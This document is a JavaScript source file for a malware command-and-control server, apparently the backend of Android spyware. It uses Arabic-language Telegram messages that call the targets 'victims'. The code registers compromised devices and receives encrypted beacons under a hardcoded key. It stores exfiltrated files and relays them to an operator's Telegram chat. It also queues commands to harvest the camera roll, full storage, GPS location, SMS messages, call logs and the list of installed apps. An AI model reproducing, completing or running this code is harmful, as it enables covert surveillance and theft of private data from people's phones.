// server_uranium_core.js - Uranium Absolute Sovereign C2 Core v7.8 Ultimate
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const sqlite3 = require('sqlite3').verbose();

const token = process.env.TG_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TG_ID || process.env.CHAT_ID || process.env.TELEGRAM_CHAT_ID;
const MASTER_SECRET = "BlackActivationMasterKey2026Sovereign";

if (!token || !chatId) {
    console.error('[-] Critical Error: Telegram credentials missing.');
    process.exit(1);
}

const UPLOAD_DIR = path.join(__dirname, 'uranium_storage_v78');
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_sovereign_v78.db', (err) => {
    if (err) console.error('DB Error:', err.message);
    else {
        db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
        db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
    }
});

const app = express();
const appBot = new telegramBot(token, { polling: true });

// 🛡️ درع حماية لتجاهل أخطاء الـ Polling والتداخل المؤقت لضمان استقرار السيرفر 24/7
appBot.on('polling_error', (error) => {
    // تجاهل أخطاء التداخل الوهمية لكي يظل السيرفر مشتعلاً بالأخضر المستقر
});

function decryptPayload(reqBody) {
    try {
        const jsonStr = Buffer.from(reqBody, 'base64').toString('utf8');
        const packet = JSON.parse(jsonStr);
        const iv = Buffer.from(packet.v, 'hex');
        const tag = Buffer.from(packet.g, 'hex');
        const encrypted = Buffer.from(packet.d, 'hex');

        const key = crypto.createHash('sha256').update(MASTER_SECRET).digest();
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);

        const decryptedCompressed = Buffer.concat([decipher.update(encrypted), decipher.final()]);
        const decompressed = zlib.gunzipSync(decryptedCompressed);
        return JSON.parse(decompressed.toString('utf8'));
    } catch (e) {
        return null;
    }
}

app.use(express.text({ type: 'application/json', limit: '50mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '2000mb' }));

async function sendTg(msg, options = {}) {
    try {
        return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
    } catch (e) {
        console.error('TG Error:', e.message);
    }
}

app.get('/', (req, res) => {
    res.status(200).send(`<html><body style="background:#050505;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM SOVEREIGN C2 CORE v7.8 ULTIMATE ONLINE [☢️]</h1></body></html>`);
});

app.post('/api/v3/uranium/upload_raw', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';
        const fileName = req.headers['x-file-name'] || `uranium_sovereign_${Date.now()}.bin`;

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);

        if (!req.body || !Buffer.isBuffer(req.body)) {
            return res.status(400).json({ status: 'BAD_BINARY_PAYLOAD' });
        }

        const safeName = path.basename(fileName);
        const finalPath = path.join(UPLOAD_DIR, `${nodeId}_${Date.now()}_${safeName}`);
        fs.writeFileSync(finalPath, req.body);

        const fileSizeMB = req.body.length / (1024 * 1024);
        await appBot.sendDocument(chatId, finalPath, { 
            caption: `👹 <b>غنائم اليورانيوم المرعبة v7.8:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
        });

        res.status(200).json({ status: 'OK', message: 'URANIUM_SOVEREIGN_UPLOAD_SUCCESS' });
    } catch (e) {
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

app.post('/api/v3/uranium/stream', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';
        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);

        let payload = decryptPayload(req.body);
        if (!payload) {
            try {
                payload = JSON.parse(req.body);
            } catch (err) {
                payload = { type: "RAW_TEXT", data: req.body };
            }
        }

        let directive = { status: 'ACK', task: null };

        if (payload && payload.type === 'TEXT_REPORT') {
            await sendTg(`👹 <b>تقرير قبضة اليورانيوم [<code>${nodeId}</code>]:</b>\n<pre>${String(payload.data).substring(0, 3500)}</pre>`);
        }

        db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
            if (!err && row) {
                let parsedPayload = {};
                try { parsedPayload = JSON.parse(row.payload || '{}'); } catch (ex) {}
                directive.task = { id: row.id, action: row.action, payload: parsedPayload };
                db.run(`UPDATE tasks SET status = 'SENT' WHERE id = ?`, [row.id]);
            }
            res.status(200).json(directive);
        });
    } catch (e) {
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(chatId)) return;
    const text = msg.text;

    if (text === '/start') {
        db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
            if (err || !rows || rows.length === 0) {
                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم نشطة حالياً.</b>`);
                return;
            }
            let inlineKeyboard = [];
            rows.forEach(node => {
                inlineKeyboard.push([{ text: `👹 ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
            });
            await sendTg(`☢️ <b>غرفة القيادة المرعبة للإمبراطورية v7.8:</b>\nاختر الضحية:`, {
                reply_markup: { inline_keyboard: inlineKeyboard }
            });
        });
    }
});

appBot.on('callback_query', async (query) => {
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '☢️ حصاد الكاميرا الشامل (ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
                    { text: '📥 سحب التخزين الكامل', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                ],
                [
                    { text: '📍 تحديد الموقع GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
                    { text: '📱 التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                ],
                [
                    { text: '📨 الرسائل SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
                    { text: '📞 سجل المكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
                ],
                [{ text: '🔙 عودة', callback_data: 'back_home' }]
            ]
        };
        await appBot.editMessageText(`🎯 <b>الضحية:</b> <code>${nodeId}</code>`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    } else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');
        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async (err) => {
            if (!err) {
                await appBot.answerCallbackQuery(query.id, { text: `👹 تم إطلاق أمر [${action}] بنجاح!` });
            }
        });
    } else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id);
        await sendTg(`أرسل <code>/start</code> لإظهار القائمة.`);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium Sovereign C2 Core v7.8 Ultimate Online on port ${PORT}`));
